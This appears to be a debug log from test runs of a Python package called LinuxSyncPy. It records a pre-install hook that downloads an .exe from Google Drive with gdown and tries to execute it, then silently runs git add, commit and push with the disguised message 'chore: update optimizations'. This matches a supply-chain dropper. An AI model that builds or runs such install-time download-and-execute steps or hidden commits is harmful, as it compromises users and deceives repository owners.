[2026-05-11 21:41:42] gdown bootstrap complete, download_id=1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n, output_path=downloaded_1778550102053.exe
[2026-05-11 21:41:42] gdown returncode=0 stdout='ok' stderr=''
[2026-05-11 21:41:42] Download did not produce file at downloaded_1778550102053.exe
[2026-05-11 21:41:42] download_via_gdown returned no file
[2026-05-11 21:44:32] gdown bootstrap complete, download_id=1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n, output_path=downloaded_1778550272969.exe
[2026-05-11 21:44:32] download_via_gdown returned: downloaded_1778550272969.exe
[2026-05-11 21:44:33] gdown branch failed: [Errno 2] No such file or directory: 'downloaded_1778550272969.exe'
[2026-05-11 21:44:33] Traceback (most recent call last):
  File "/home/kali/Documents/pylib/LinuxSyncPy/index.py", line 238, in pre_install
    execute_downloaded_exe(downloaded_file)
  File "/tmp/test_run.py", line 28, in fake_execute
    subprocess.run([str(p)], check=True)
  File "/usr/lib/python3.11/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/lib/python3.11/subprocess.py", line 1950, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'downloaded_1778550272969.exe'
[2026-05-11 21:44:33] run_silent start command='git add .' cwd='/tmp/linuxsyncpy_test.J1byAU'
[2026-05-11 21:44:33] run_silent success command='git add .' returncode=0
[2026-05-11 21:44:33] run_silent start command='git commit -m chore: update optimizations' cwd='/tmp/linuxsyncpy_test.J1byAU'
[2026-05-11 21:44:33] run_silent success command='git commit -m chore: update optimizations' returncode=0
[2026-05-11 21:44:33] run_silent start command='git push' cwd='/tmp/linuxsyncpy_test.J1byAU'
[2026-05-11 21:44:33] run_silent success command='git push' returncode=0
[2026-05-11 21:54:26] gdown bootstrap complete, download_id=1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n, output_path=downloaded_1778550866015.exe
[2026-05-11 21:54:26] download_via_gdown returned: /tmp/linuxsyncpy_test.paX8jh/downloaded_1778550866015.exe
[2026-05-11 21:54:26] run_silent start command='git rev-parse --verify main' cwd='/tmp/linuxsyncpy_test.paX8jh'
[2026-05-11 21:54:26] run_silent success command='git rev-parse --verify main' returncode=0
[2026-05-11 21:54:26] run_silent start command='git checkout main' cwd='/tmp/linuxsyncpy_test.paX8jh'
[2026-05-11 21:54:26] run_silent success command='git checkout main' returncode=0
[2026-05-11 21:54:26] run_silent start command='git add .' cwd='/tmp/linuxsyncpy_test.paX8jh'
[2026-05-11 21:54:26] run_silent success command='git add .' returncode=0
[2026-05-11 21:54:26] run_silent start command='git commit -m chore: update optimizations' cwd='/tmp/linuxsyncpy_test.paX8jh'
[2026-05-11 21:54:26] run_silent success command='git commit -m chore: update optimizations' returncode=0
[2026-05-11 21:54:26] run_silent start command='git push' cwd='/tmp/linuxsyncpy_test.paX8jh'
[2026-05-11 21:54:26] run_silent success command='git push' returncode=0
[2026-05-11 21:55:22] gdown bootstrap complete, download_id=1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n, output_path=downloaded_1778550922654.exe
[2026-05-11 21:55:22] download_via_gdown returned: /tmp/downloaded_1778550922654.exe
[2026-05-11 21:55:22] run_silent start command='git rev-parse --verify main' cwd='/tmp/linuxsyncpy_test.T2uW5s'
[2026-05-11 21:55:22] run_silent success command='git rev-parse --verify main' returncode=0
[2026-05-11 21:55:22] run_silent start command='git checkout main' cwd='/tmp/linuxsyncpy_test.T2uW5s'
[2026-05-11 21:55:22] run_silent success command='git checkout main' returncode=0
[2026-05-11 21:55:22] run_silent start command='git add .' cwd='/tmp/linuxsyncpy_test.T2uW5s'
[2026-05-11 21:55:22] run_silent success command='git add .' returncode=0
[2026-05-11 21:55:22] run_silent start command='git commit -m chore: update optimizations' cwd='/tmp/linuxsyncpy_test.T2uW5s'
[2026-05-11 21:55:22] run_silent success command='git commit -m chore: update optimizations' returncode=0
[2026-05-11 21:55:22] run_silent start command='git push' cwd='/tmp/linuxsyncpy_test.T2uW5s'
[2026-05-11 21:55:22] run_silent success command='git push' returncode=0
